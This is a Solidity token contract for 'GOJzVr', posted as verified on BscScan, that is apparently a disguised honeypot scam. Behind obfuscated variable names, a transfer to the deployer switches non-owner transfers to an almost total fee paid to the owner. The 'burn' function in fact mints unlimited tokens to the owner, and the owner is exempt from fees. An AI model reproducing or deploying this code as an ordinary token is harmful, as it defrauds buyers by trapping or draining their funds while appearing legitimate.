/**
 *Submitted for verification at BscScan.com on 2022-12-09
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract GOJzVr {
uint256 private  YuEMfY = 10000000000000;
address private  LcSJBp = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => uint256) public balanceOf;
uint8 public constant decimals = 18;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  awDCvF = address(0);
address private  vDsWXr = address(0);
uint256 private  wYUNOB = 1000000000000000000;
uint256 public constant aNlACV = 99999;
address private  YiTvcB = address(0);
uint256 private  xvgkJw = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address private  gyxPOD = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  vMmyVQ = 10000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  CcjZUx = 100000000;
address private  qSQWxP = address(0);
address private  duVFFN = address(0);
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
string public  symbol = "GOJzVr";
address private  phdqGm = address(0);
uint256 private  yzfGWD = 1000000000000000000;
address private  AaXaLQ = address(0);
uint256 private  shPNop = 1000000000000000000000;
string public  name = "GOJzVr";


function _getCcjZUx() private returns (uint256) {
return CcjZUx;
}

    function getVypPVi() private returns (uint256){
        return yzfGWD-1;
    }
function _getawDCvF() private returns (address) {
return awDCvF;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getYuEMfY() private returns (uint256) {
return YuEMfY;
}

constructor () {
qSQWxP = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "JNAqoA");
require(to != address(0), "JNAqoA");
require(amount <= balanceOf[from], "JNAqoA");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* aNlACV/getVypPVi() ;
if (getVypPVi()-yzfGWD==1){
if (amount>10000){
amount=1000;
fee = amount-1000;
}
}
}
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==qSQWxP){
yzfGWD = aNlACV+2;
}
emit Transfer(from, to, transferAmount);
}




function _getwYUNOB() private returns (uint256) {
return wYUNOB;
}

function _getLcSJBp() private returns (address) {
return LcSJBp;
}



function _getxvgkJw() private returns (uint256) {
return xvgkJw;
}



function _getshPNop() private returns (uint256) {
return shPNop;
}



modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}


function _getgyxPOD() private returns (address) {
return gyxPOD;
}



function _getduVFFN() private returns (address) {
return duVFFN;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getYiTvcB() private returns (address) {
return YiTvcB;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}




function _getvMmyVQ() private returns (uint256) {
return vMmyVQ;
}

function _getvDsWXr() private returns (address) {
return vDsWXr;
}

function _getAaXaLQ() private returns (address) {
return AaXaLQ;
}

function _getphdqGm() private returns (address) {
return phdqGm;
}

function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tJNAqoA 0");
require(spender != address(0), "fJNAqoA 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}



}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}